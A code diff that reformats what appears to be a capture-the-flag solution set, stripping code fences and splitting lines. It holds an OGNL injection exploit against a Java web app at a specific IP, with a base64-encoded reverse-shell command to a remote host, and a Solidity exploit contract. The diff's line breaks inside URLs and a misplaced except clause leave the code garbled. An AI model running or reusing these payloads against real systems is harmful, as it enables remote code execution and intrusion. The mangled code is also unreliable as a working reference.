@@ -13,20 +13,17 @@ import requests as req
 from urllib.parse import quote
 import base64
 
-url = "http://120.55.13.151:8080/app/user/%s"
+url = "http://120.55.13.151:
+8080/app/user/%s"
 headers = {
     "Accept": "application/json, text/plain, */*",
-    "Referer": "http://120.55.13.151:8080/app/",
+    "Referer": "http://120.55.13.151:
+8080/app/",
     "Connection": "close"}
 
 payload = '(#r="a".getClass().forName("java.lang.Runtime")).(#m=#r.getDeclaredMethods().{^ #this.name.equals("getRuntime")}[0]).(#o=#m.invoke(null,null)).(#e=#r.getDeclaredMethods().{? #this.name.equals("exec")}.{? #this.getParameters()[0].getType().getName().equals("[Ljava.lang.String;")}.{? #this.getParameters().length == 1}[0]).(#e.invoke(#o,new String[]{"sh","-c","echo %s |base64 -d|bash"}))' % base64.b64encode(b"bash -i >& /dev/tcp/vps/8099 0>&1")
 payload = "../../action/%s" % quote(quote(payload))
 resp = req.get(url % payload.replace("/","%252F"), headers=headers)
-```
-
-
-
-```
 contract exp {
     address public greeter;
     constructor(address _greeter) public {
@@ -77,13 +74,8 @@ contract exp {
         Greeter(greeter).b(leafs, proofs, index);
     }
 }
-```
-
-
-
-```
-#include <stdio.h>
-#include <stdint.h>
+    #include <stdio.h>
+    #include <stdint.h>
 
 uint8_t enc[] = {
     0x3e, 0xdd, 0x79, 0x25, 0xcd, 0x6e, 0x04, 0xab,
@@ -121,12 +113,7 @@ int main() {
     printf("n");
     return 0;
 }
-```
-
-
-
-```
-#pip3 install aliyun-iot-linkkit 
+    #pip3 install aliyun-iot-linkkit 
 import sys
 from linkkit import linkkit
 import threading
@@ -193,7 +180,8 @@ lk.start_worker_loop()
 while True:
     try:
         msg = input()
-    except KeyboardInterrupt:
+    
+except KeyboardInterrupt:
         sys.exit()
     else:
         if msg == "1":
